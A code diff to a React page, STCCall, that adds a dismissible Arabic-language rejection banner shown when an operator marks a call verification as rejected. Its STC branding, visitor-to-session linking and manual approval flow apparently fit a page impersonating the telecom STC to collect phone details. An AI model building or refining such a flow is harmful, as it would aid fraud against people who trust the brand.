@@ -8,6 +8,7 @@ import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import stcLogo from "@/assets/stc-logo.svg";
 
 const STCCall = () => {
@@ -22,6 +23,7 @@ const STCCall = () => {
 
   const [received, setReceived] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [showButton, setShowButton] = useState(false);
   const [countdown, setCountdown] = useState(10);
@@ -37,6 +39,7 @@ const STCCall = () => {
       toast.error(sc.rejected);
       setWaitingApproval(false);
       setReceived(false);
+      setRejected(true);
     }
   }, [approvalStatus, orderId, navigate, offer, phone, carrier]);
 
@@ -70,6 +73,11 @@ const STCCall = () => {
             animate={{ opacity: 1, y: 0 }}
             transition={{ duration: 0.4 }}
           >
+            <RejectionBanner
+              show={rejected}
+              message="لم يتم التحقق من المكالمة. يرجى التأكد من استلام الاتصال من STC وإعادة المحاولة."
+              onDismiss={() => setRejected(false)}
+            />
             {/* Call animation */}
             <motion.div
               className="flex flex-col items-center gap-2"
